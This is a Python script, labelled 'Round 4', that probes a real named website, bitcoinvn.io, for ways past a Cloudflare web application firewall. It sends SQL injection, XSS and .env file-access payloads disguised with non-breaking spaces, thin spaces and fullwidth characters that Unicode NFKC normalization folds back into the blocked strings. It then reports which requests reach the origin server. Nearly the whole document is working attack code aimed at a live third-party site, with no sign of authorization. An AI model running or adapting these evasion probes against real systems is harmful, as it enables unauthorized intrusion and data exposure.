#!/usr/bin/env python3
"""Round 4: NFKC-reconstructing 'chunk' probes — CF sees exotic bytes, a normalizing
downstream layer (NFKC) would re-fold them to the blocked ASCII phrase."""
import subprocess

def probe(path):
    url = "https://bitcoinvn.io" + path
    r = subprocess.run(["curl","-s","-o","/dev/null","-D","-","--max-time","15",
                        "-A","Mozilla/5.0", url], capture_output=True, text=True)
    h=r.stdout.lower(); status=""
    for line in h.splitlines():
        if line.startswith("http/"): status=line.split()[1]
    # CF edge block: 403 WITHOUT CSP header; origin 403 HAS CSP
    where = "CF-WAF-BLOCK" if (status=="403" and "content-security-policy" not in h) else f"REACHED-ORIGIN({status})"
    return status, where

NBSP="\u00a0"; THIN="\u2009"; FW_DOT="\uff0e"
def q(s): return s  # curl --path-as-is handles raw utf8 via urlencoding below
from urllib.parse import quote

# chunk constructions that NFKC-fold back to real signatures
tests = {
 "sqli-nbsp-sep":      "/?q=" + quote("' UNION\u00a0SELECT\u00a01,2-- -"),
 "sqli-thin-sep":      "/?q=" + quote("' UNION\u2009SELECT\u20091,2-- -"),
 "sqli-fullwidth-kw":  "/?q=" + quote("\uff21\uff2c\uff25\uff32\uff54 \uff35\uff2e\uff29\uff2f\uff2e select"),
 "sqli-fw-space":      "/?q=" + quote("union\u3000select"),           # ideographic space -> NFKC ' '
 "dotfile-fw-dot":     "/" + quote("\uff0eenv"),                        # ＮＦＫＣ → .env
 "dotfile-nbsp-env":   "/%c2%a0" + quote("env"),                        # NBSP prefix (no fold to dot)
 "xss-svg-nbsp":       "/?p=" + quote("<svg\u00a0onload=alert(1)>"),
 "xss-svg-thin":       "/?p=" + quote("<svg\u2009onload=alert(1)>"),
 "xss-onerror-thin":   "/?p=" + quote("<img src=x\u00a0onerror=alert(1)>"),
}
for name,path in tests.items():
    st, verdict = probe(path)
    print(f"{name:22} HTTP={st:4} {verdict}")
